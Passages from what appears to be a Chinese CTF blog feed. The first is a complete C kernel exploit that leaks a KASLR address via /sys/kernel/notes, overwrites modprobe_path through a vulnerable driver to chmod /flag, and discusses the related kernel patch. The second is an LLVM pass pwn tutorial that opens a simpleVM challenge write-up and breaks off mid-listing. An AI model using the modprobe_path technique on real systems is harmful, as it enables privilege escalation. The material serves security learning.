class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff82e8b920</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> vul;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">size_t</span> addr, <span class="type">size_t</span> vul)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">thisNote</span>;</span></span><br><span class="line">    thisNote.addr = addr;</span><br><span class="line">    thisNote.vul = vul;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;thisNote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> leak, kernel_base;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x22961c0</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    arb_write(modprobe_path, <span class="number">0x7465672f706d742f</span>);</span><br><span class="line">    arb_write(modprobe_path + <span class="number">8</span>, <span class="number">0x6c6c656873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is %s\n&quot;</span>,data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：  </p><img src="/2024/04/17/notes/2.png" class="" title="我的图图呢">  <p>显然泄露出来的内核地址是可用的。通过调试发现泄露出来的是 <code>startup_xen</code> 的地址  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line"><span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_INIT_P2M,       .quad (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然而 <code>Cook</code> 发布了 <code>leaking_addresses.pl</code> 的补丁。它可以读取内核符号文件（例如 <code>/proc/kallsyms</code> ），并查看与这些符号关联的地址是否出现在 <code>/sys/kernel/notes</code> 这样的二进制文件中。有了此更改之后， <code>leaking_addresses.pl</code> 就会发现这种长期存在的内核地址泄露，但我感觉还是会有漏网之鱼（笑  </p><p>reference：<br><a href="https://lore.kernel.org/all/202402180028.6DB512C50@keescook/">https://lore.kernel.org/all/202402180028.6DB512C50@keescook/</a><br><a href="https://lwn.net/Articles/962782/">https://lwn.net/Articles/962782/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvm pass pwn</title>
      <link href="/2024/03/15/llvm/"/>
      <url>/2024/03/15/llvm/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>既然说到<code>llvm pass pwn</code>，我们肯定要先了解<code>llvm</code>到底是一个什么东西<br>学过编译原理的人应该都知道，编译过程主要可以划分为前端与后端：  </p><ul><li>前端把源代码翻译成中间表示 (<code>IR</code>)</li><li>后端把IR编译成目标平台的机器码。当然，<code>IR</code>也可以给解释器解释执行</li></ul><p>然而，经典的编译器如<code>gcc</code>在设计上都是提供一条龙服务的： 你不需要知道它使用的<code>IR</code>是什么样的，它也不会暴露中间接口来给你操作它的<code>IR</code>。 换句话说，从前端到后端，这些编译器的大量代码都是强耦合的。  </p><p>这样做有好处也有坏处。好处是，因为不需要暴露中间过程的接口，它可以在内部做任何想做的平台相关的优化。 而坏处是，每当一个新的平台出现，这些编译器都要各自为政实现一个从自己的<code>IR</code>到新平台的后端。 甚至如果当一种新语言出现，且需要实现一个新的编译器，那么可能需要设计一个新的<code>IR</code>，以及针对大部分平台实现这个<code>IR</code>的后端。 不妨想一下，如果有M种语言、<code>N</code>种目标平台，那么最坏情况下要实现 <code>M*N</code> 个前后端。这是很低效的。  </p><p>因此，我们很自然地会想，如果大家都共用一种<code>IR</code>呢？ 那么每当新增加一种语言，我们就只要添加一个这个语言到<code>IR</code>的前端； 每当新增加一种目标平台，我们就只要添加一个<code>IR</code>到这个目标平台的后端。 如果有M种语言、N种目标平台，那么最优情况下我们只要实现 <code>M+N</code> 个前后端。  </p><p>而<code>LLVM</code>就是这样一个项目。<code>LLVM</code>的核心设计了一个叫 <code>LLVM IR</code> 的中间表示， 并以库(<code>Library</code>) 的方式提供一系列接口， 为你提供诸如操作<code>IR</code>、生成目标平台代码等等后端的功能。  </p><p>那么 <code>LLVM Pass</code> 又是什么呢？ <code>Pass</code>就是“遍历一遍<code>IR</code>，可以同时对它做一些操作”的意思。翻译成中文应该叫“趟”。 在实现上，<code>LLVM</code>的核心库中会给你一些 <code>Pass</code>类 去继承。你需要实现它的一些方法。 最后使用<code>LLVM</code>的编译器会把它翻译得到的<code>IR</code>传入<code>Pass</code>里，给你遍历和修改。  </p><p>下面列出几个比较重要的命令行工具：  </p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的不是目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是<code>LLVM IR</code>的二进制格式，而不是机器码。</li><li><code>opt</code>：优化<code>LLVM IR</code>。输出新的<code>LLVM IR</code>。</li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行<code>LLVM IR</code>。</li></ul><p>下面简单聊聊<code>llvm IR</code>  </p><h2 id="何为LLVM-IR"><a href="#何为LLVM-IR" class="headerlink" title="何为LLVM IR"></a>何为LLVM IR</h2><ul><li><code>LVM IR</code> 是一门低级编程语言，语法类似于汇编</li><li>任何高级编程语言（如<code>C++</code>）都可以用 <code>LLVM IR</code> 表示</li><li>基于 <code>LLVM IR</code> 可以很方便地进行代码优化(任何编程语言都能统一转换为<code>LLVM IR</code>)</li></ul><img src="/2024/03/15/llvm/1.png" class="" title="我的图图呢">  <h2 id="LLVM-IR的两种表示方法"><a href="#LLVM-IR的两种表示方法" class="headerlink" title="LLVM IR的两种表示方法"></a>LLVM IR的两种表示方法</h2><ul><li>人类可以阅读的文本形式，文件后缀为 <code>.ll</code></li><li>易于机器处理的二进制格式，文件后缀为 <code>.bc</code></li></ul><p>下面给出一些常用的指令：  </p><ul><li>.c -&gt; .ll：clang -emit-llvm -S exp.c -o exp.ll</li><li>.c -&gt; .bc: clang -emit-llvm -c exp.c -o exp.bc</li><li>.ll -&gt; .bc: llvm-as a.ll -o exp.bc</li><li>.bc -&gt; .ll: llvm-dis a.bc -o exp.ll</li><li>.bc -&gt; .s: llc exp.bc -o exp.s</li></ul><p>下面来分析官方文档中一个入门级别的<code>llvm pass</code>程序：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// 重写runOnFunction，使得每遍历到一个函数时就输出函数名</span></span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>, <span class="comment">// 使用 RegisterPass 宏注册 Hello Pass。这允许它通过命令行参数传递给LLVM工具</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>这段代码的主要内容是注册了一个<code>Hello</code>函数，重写了<code>runOnFunction</code>函数，使得每遍历到一个函数时就输出函数名。  </p><p>一般来说，在<code>pwn</code>题中，漏洞主要来自于<code>so</code>文件中，而漏洞多产生于重写了<code>so</code>文件中的<code>runOnFunction</code>函数，我们可以通过在<code>ida</code>中搜索<code>vtable</code>来定位这一个函数，而我们要攻击的则是<code>opt</code>这个<code>elf</code>文件<br>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位  </p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载常见的<code>clang</code>和<code>llvm</code>版本  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>其中<code>opt</code>是<code>LLVM</code>的优化器和分析器，可加载指定的模块，对输入的<code>LLVM IR</code>或者<code>LLVM</code>字节码进行优化或分析。<code>CTF</code>题目一般会给出所需版本的<code>opt</code>文件（可用<code>./opt --version</code>查看版本）或者在<code>README</code>文档中告知<code>opt</code>版本。安装好<code>llvm</code>后，可在<code>/usr/lib/llvm-xx/bin/opt</code>路径下找到对应<code>llvm</code>版本的<code>opt</code>文件（一般不开<code>PIE</code>保护）  </p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb opt-8</span><br><span class="line">set args -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="红帽杯-2021-simpleVM"><a href="#红帽杯-2021-simpleVM" class="headerlink" title="[红帽杯 2021] simpleVM"></a>[红帽杯 2021] simpleVM</h2><p>好习惯，上来先给<code>opt-8</code>来一发<code>checksec</code>  </p><img src="/2024/03/15/llvm/2.png" class="" title="我的图图呢">  <p>可以发现程序并没有开启<code>PIE</code>保护而且<code>got</code>表可改<br>将<code>VMPass.so</code>拖进<code>ida</code>，漏洞通常都在这一个<code>so</code>文件中<br>我们首先看<code>start</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_6510</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>PASS</code>注册名称为<code>VMPass</code>。我们尝试在<code>ida</code>中查找<code>runOnFunction</code>函数，结果发现这个函数的符号表给删了？图片中的<code>sub_6830</code>函数即为我们要找的<code>runOnFunction</code>函数函数  </p><img src="/2024/03/15/llvm/3.png" class="" title="我的图图呢">  <p>接下来分析一下<code>runOnFunction</code>函数  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改函数先通过<code>getName(a2)</code>来获取<code>.ll</code>文件中定义的函数名字，如果该函数的名字为<code>o0o0o0o0</code>，则会进入<code>sub_6AC0</code>这个函数进行进一步的处理<br>定位到关键函数<code>sub_6B80</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 